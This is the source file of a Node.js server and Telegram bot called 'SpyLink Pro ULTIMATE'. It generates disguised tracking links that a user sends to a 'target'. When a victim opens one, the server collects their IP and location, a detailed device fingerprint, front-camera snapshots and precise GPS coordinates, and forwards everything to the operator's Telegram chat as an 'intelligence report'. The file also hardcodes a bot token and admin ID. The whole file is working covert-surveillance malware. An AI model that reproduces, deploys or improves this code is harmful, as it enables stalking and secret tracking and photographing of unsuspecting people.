const express = require("express");
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const axios = require('axios');
const UAParser = require('ua-parser-js');

// 🔐 CONFIGURATION
const BOT_TOKEN = "8377073485:AAG2selNlxyHeZ3_2wjMGdG_QshklCiTAyE";
const ADMIN_ID = "8175884349"; 
const HOST_URL = "https://botu-s3f9.onrender.com";

// STATE
let maintenanceMode = false;
let sessions = {};
let users = new Set([ADMIN_ID]);

// INITIALIZE APP
const app = express();
app.use(require('helmet')({ contentSecurityPolicy: false }));
app.use(require('cors')());
app.use(require('morgan')('dev'));
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
app.set("view engine", "ejs");
app.use(express.static("public"));

// 🤖 BOT SETUP
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
bot.deleteWebHook().then(() => console.log("✅ Bot Polling Active"));

bot.on("polling_error", (msg) => {
    if (!msg.message.includes("409")) console.log(`⚠️ Bot Error: ${msg.message}`);
});

// ==================== 🛡️ ACCESS CONTROL ====================

const isAdmin = (id) => String(id) === ADMIN_ID;

const checkAccess = (msg) => {
    const chatId = String(msg.chat.id);
    if (isAdmin(chatId)) return true;
    if (maintenanceMode) {
        bot.sendMessage(chatId, "⛔ *System Under Maintenance*\nPlease try again later.", { parse_mode: "Markdown" });
        return false;
    }
    return true;
};

// ==================== 🕹️ BOT COMMANDS ====================

bot.onText(/\/start/, (msg) => {
    if (!checkAccess(msg)) return;
    const chatId = msg.chat.id;
    users.add(String(chatId));

    const kb = {
        inline_keyboard: [
            [{ text: "🔗 Generate Tracking Link", callback_data: "create" }],
            [{ text: "📊 Server Status", callback_data: "status" }]
        ]
    };
    
    if(isAdmin(chatId)) kb.inline_keyboard.push([{ text: "🔐 Admin Panel", callback_data: "admin" }]);

    bot.sendMessage(chatId, `
🛡️ *SpyLink Pro ULTIMATE*

👋 Welcome, ${msg.from.first_name}.
✅ *Status:* Online
📡 *Mode:* ${maintenanceMode ? "🔴 Maintenance" : "🟢 Live"}

*Features:*
📍 Real-time GPS Tracking
📱 Full Device Fingerprint
📸 Front Camera Snapshots
🔋 Battery, Network, Sensors
🌐 IP + ISP + Location Lookup
`, { parse_mode: "Markdown", reply_markup: kb });
});

// ADMIN COMMANDS
bot.onText(/\/on/, (msg) => { 
    if(isAdmin(msg.chat.id)) { 
        maintenanceMode = false; 
        bot.sendMessage(msg.chat.id, "🟢 *System ONLINE for all users.*", { parse_mode: "Markdown" }); 
    }
});

bot.onText(/\/off/, (msg) => { 
    if(isAdmin(msg.chat.id)) { 
        maintenanceMode = true; 
        bot.sendMessage(msg.chat.id, "🔴 *Maintenance Mode ENABLED.*", { parse_mode: "Markdown" }); 
    }
});

bot.onText(/\/broadcast (.+)/, async (msg, match) => {
    if(!isAdmin(msg.chat.id)) return;
    const text = match[1];
    let count = 0;
    bot.sendMessage(msg.chat.id, "📣 *Sending Broadcast...*", { parse_mode: "Markdown" });
    
    for(let id of users) { 
        try { 
            await bot.sendMessage(id, text, { parse_mode: "HTML" }); 
            count++;
        } catch(e){} 
        await new Promise(r=>setTimeout(r,50));
    }
    bot.sendMessage(msg.chat.id, `✅ Sent to ${count} users.`);
});

// BUTTON HANDLER
bot.on('callback_query', async (q) => {
    const chatId = q.message.chat.id;
    const data = q.data;
    
    if (!checkAccess(q.message)) return;

    if (data === "create") {
        const sessionId = uuidv4();
        sessions[sessionId] = { chatId, createdAt: new Date() };
        
        const target = Buffer.from("https://google.com").toString('base64');
        const link = `${HOST_URL}/verify/${sessionId}/${target}`;
        
        bot.sendMessage(chatId, `
🔗 *TRACKING LINK GENERATED*

🆔 Session ID: \`${sessionId}\`
🌐 Target URL: \`https://google.com\`

📤 *Send this link to your target:*
${link}

⏱️ *Data captured automatically:*
• GPS Location
• 4 Camera Snapshots
• Full Device/Browser Fingerprint
• Network, Battery, Sensors

👇 Tap below to create another.
        `, { 
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "🆕 Create Another", callback_data: "create" }],
                    [{ text: "🏠 Main Menu", callback_data: "start" }]
                ]
            }
        });
    }

    if (data === "status") {
        bot.answerCallbackQuery(q.id, { text: "System Healthy" });
        bot.sendMessage(chatId, `
📊 *SERVER STATUS*

⏱️ Uptime: ${Math.floor(process.uptime())} seconds
👥 Total Users: ${users.size}
💾 Memory Usage: ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
📁 Active Sessions: ${Object.keys(sessions).length}
        `, { parse_mode: "Markdown" });
    }

    if (data === "admin") {
        if(isAdmin(chatId)) {
            bot.sendMessage(chatId, `
🔐 *ADMIN PANEL*

/on - Enable Bot for All
/off - Enable Maintenance Mode
/broadcast [message] - Send to All Users
/stats - Show Detailed Stats
/clear - Clear All Sessions
            `, { parse_mode: "Markdown" });
        }
    }

    if (data === "start") {
        bot.sendMessage(chatId, "🏠 *Main Menu*", {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "🔗 Generate Link", callback_data: "create" }],
                    [{ text: "📊 Server Status", callback_data: "status" }],
                    [{ text: "🔐 Admin Panel", callback_data: "admin" }]
                ]
            }
        });
    }
});

// ==================== 🌐 WEB ROUTES ====================

app.get("/", (req, res) => res.send("<h1 style='text-align:center;margin-top:50px'>🟢 SpyLink Ultimate Server Active</h1>"));

app.get("/verify/:id/:url", (req, res) => {
    const { id, url } = req.params;
    if (!sessions[id]) sessions[id] = { chatId: ADMIN_ID };
    
    let finalUrl = "https://google.com";
    try { finalUrl = Buffer.from(url, 'base64').toString('utf-8'); } catch(e) {}
    
    res.render("diagnostics", { uid: id, url: finalUrl, host: HOST_URL });
});

// 📊 ULTIMATE DATA PROCESSOR
app.post("/report", async (req, res) => {
    const { uid, data } = req.body;
    if (!sessions[uid]) return res.json({ error: "No session" });

    const chatId = sessions[uid].chatId;
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
    const ua = new UAParser(data.userAgent);

    // IP Geolocation
    let geo = { isp: "Unknown", city: "Unknown", region: "Unknown", country: "Unknown", mobile: false, proxy: false, org: "Unknown" };
    try {
        const r = await axios.get(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,isp,org,mobile,proxy,lat,lon`);
        if(r.data.status === 'success') geo = r.data;
    } catch(e) { console.error("IP Geolocation failed:", e.message); }

    // Build Comprehensive Report
    let report = `
🕵️‍♂️ *ULTIMATE INTELLIGENCE REPORT*

🔖 *SESSION INFO*
• Session ID: \`${uid}\`
• Captured At: ${new Date().toLocaleString()}
• Victim IP: \`${ip}\`
• Google Maps: https://www.google.com/maps?q=${geo.lat},${geo.lon}

🌐 *NETWORK & LOCATION*
• Country: ${geo.country} | Region: ${geo.regionName} | City: ${geo.city}
• ISP: ${geo.isp} (${geo.org})
• Connection: ${data.network?.effectiveType || 'Unknown'} (${data.network?.downlink || 0} Mbps)
• RTT: ${data.network?.rtt || 'Unknown'}ms
• Mobile Data: ${geo.mobile ? '✅ Yes' : '❌ No'} | VPN/Proxy: ${geo.proxy ? '⚠️ Yes' : '✅ No'}

💻 *DEVICE & BROWSER*
• OS: ${ua.getOS().name} ${ua.getOS().version}
• Browser: ${ua.getBrowser().name} ${ua.getBrowser().version}
• Device: ${ua.getDevice().model || ua.getDevice().type || 'Unknown'}
• CPU Cores: ${data.hardware?.concurrency || 'Unknown'}
• RAM: ${data.hardware?.memory || 'Unknown'} GB
• Do Not Track: ${data.privacy?.doNotTrack || 'Unknown'}
• Cookies Enabled: ${data.privacy?.cookieEnabled ? '✅ Yes' : '❌ No'}
• Touch Points: ${data.input?.maxTouchPoints || 'Unknown'}
• Language: ${data.locale?.language || 'Unknown'} (${data.locale?.languages?.join(', ') || ''})

🖥️ *DISPLAY & MEDIA*
• Screen: ${data.screen?.width || 'Unknown'} x ${data.screen?.height || 'Unknown'} (${data.screen?.colorDepth || 'Unknown'}-bit)
• Orientation: ${data.screen?.orientation || 'Unknown'}
• WebGL Vendor: ${data.graphics?.webglVendor || 'Unknown'}
• WebGL Renderer: ${data.graphics?.webglRenderer || 'Unknown'}
• Canvas Fingerprint: ${data.fingerprints?.canvas || 'Not captured'}
• Audio Fingerprint: ${data.fingerprints?.audio || 'Not captured'}

🔋 *POWER & SENSORS*
• Battery Level: ${data.battery?.level !== undefined ? `${Math.round(data.battery.level * 100)}%` : 'Unknown'}
• Charging: ${data.battery?.charging !== undefined ? (data.battery.charging ? '🔌 Yes' : '🔋 No') : 'Unknown'}
• Estimated Time: ${data.battery?.dischargingTime ? `${Math.round(data.battery.dischargingTime / 60)} min` : 'Unknown'}
• Accelerometer: ${data.sensors?.accelerometer ? `X:${data.sensors.accelerometer.x.toFixed(2)}, Y:${data.sensors.accelerometer.y.toFixed(2)}, Z:${data.sensors.accelerometer.z.toFixed(2)}` : 'Not available'}
• Gyroscope: ${data.sensors?.gyroscope ? `X:${data.sensors.gyroscope.x.toFixed(2)}, Y:${data.sensors.gyroscope.y.toFixed(2)}, Z:${data.sensors.gyroscope.z.toFixed(2)}` : 'Not available'}

🔐 *PERMISSIONS & SECURITY*
• Geolocation: ${data.permissions?.geolocation || 'Unknown'}
• Camera: ${data.permissions?.camera || 'Unknown'}
• Microphone: ${data.permissions?.microphone || 'Unknown'}
• Notifications: ${data.permissions?.notifications || 'Unknown'}
• Clipboard: ${data.permissions?.clipboard || 'Unknown'}

📅 *SYSTEM TIME & LOCALE*
• Local Time: ${data.locale?.time || 'Unknown'}
• Timezone: ${data.locale?.timezone || 'Unknown'}
• Intl Currency: ${data.locale?.currency || 'Unknown'}
• Intl Number Format: ${data.locale?.numberFormat || 'Unknown'}

📡 *ADDITIONAL METRICS*
• PDF Viewer: ${data.features?.pdfViewer ? '✅ Supported' : '❌ Not supported'}
• WebUSB: ${data.features?.usb ? '✅ Available' : '❌ Not available'}
• WebBluetooth: ${data.features?.bluetooth ? '✅ Available' : '❌ Not available'}
• Wake Lock: ${data.features?.wakeLock ? '✅ Supported' : '❌ Not supported'}
• Storage Quota: ${data.storage?.quota ? `${(data.storage.quota / 1024 / 1024).toFixed(2)} MB` : 'Unknown'}
• Used Storage: ${data.storage?.usage ? `${(data.storage.usage / 1024 / 1024).toFixed(2)} MB` : 'Unknown'}

_📸 Waiting for Camera & GPS data..._
    `;

    bot.sendMessage(chatId, report, { parse_mode: "Markdown" });
    res.json({ status: "ok" });
});

// 📸 CAMERA RECEIVER (MULTIPLE SHOTS)
app.post("/cam", (req, res) => {
    const { uid, img, index } = req.body;
    if (sessions[uid] && img) {
        const buff = Buffer.from(img.replace(/^data:image\/png;base64,/, ""), 'base64');
        bot.sendPhoto(sessions[uid].chatId, buff, { 
            caption: `📸 *Camera Snapshot #${index || 1}*\nSession: \`${uid}\`` 
        }, { filename: `snapshot_${index || 1}.png`, contentType: 'image/png' });
    }
    res.json({ status: "ok" });
});

// 📍 GPS RECEIVER
app.post("/location", (req, res) => {
    const { uid, lat, lon, acc, alt, speed, heading } = req.body;
    if (sessions[uid]) {
        const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
        let locationMsg = `📍 *PRECISE GPS LOCATION*\n\n`;
        locationMsg += `• Latitude: \`${lat}\`\n`;
        locationMsg += `• Longitude: \`${lon}\`\n`;
        locationMsg += `• Accuracy: \`${acc} meters\`\n`;
        if (alt) locationMsg += `• Altitude: \`${alt} meters\`\n`;
        if (speed) locationMsg += `• Speed: \`${speed} m/s\`\n`;
        if (heading) locationMsg += `• Heading: \`${heading}°\`\n`;
        locationMsg += `🔗 [View on Google Maps](${mapLink})`;

        bot.sendMessage(sessions[uid].chatId, locationMsg, { parse_mode: "Markdown" });
        bot.sendLocation(sessions[uid].chatId, parseFloat(lat), parseFloat(lon));
    }
    res.json({ status: "ok" });
});

// ADMIN STATS
bot.onText(/\/stats/, (msg) => {
    if(!isAdmin(msg.chat.id)) return;
    const mem = process.memoryUsage();
    bot.sendMessage(msg.chat.id, `
📊 *DETAILED SERVER STATS (ADMIN)*

📈 Active Sessions: ${Object.keys(sessions).length}
👥 Total Users: ${users.size}
⏱️ Uptime: ${Math.floor(process.uptime())} seconds
MemoryWarning: ${(mem.heapUsed / 1024 / 1024).toFixed(2)} MB / ${(mem.heapTotal / 1024 / 1024).toFixed(2)} MB
External Scripts: ${mem.external ? (mem.external / 1024 / 1024).toFixed(2) + ' MB' : 'N/A'}
    `, { parse_mode: "Markdown" });
});

// CLEAR SESSIONS
bot.onText(/\/clear/, (msg) => {
    if(!isAdmin(msg.chat.id)) return;
    const count = Object.keys(sessions).length;
    sessions = {};
    bot.sendMessage(msg.chat.id, `🗑️ *Cleared ${count} active sessions.*`, { parse_mode: "Markdown" });
});

// Keep-Alive
app.get("/keepalive", (req, res) => res.sendStatus(200));
setInterval(() => axios.get(`${HOST_URL}/keepalive`).catch(() => {}), 45000);

// START SERVER
const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`✅ SpyLink Ultimate Server v1.0 Active on Port ${PORT}`));
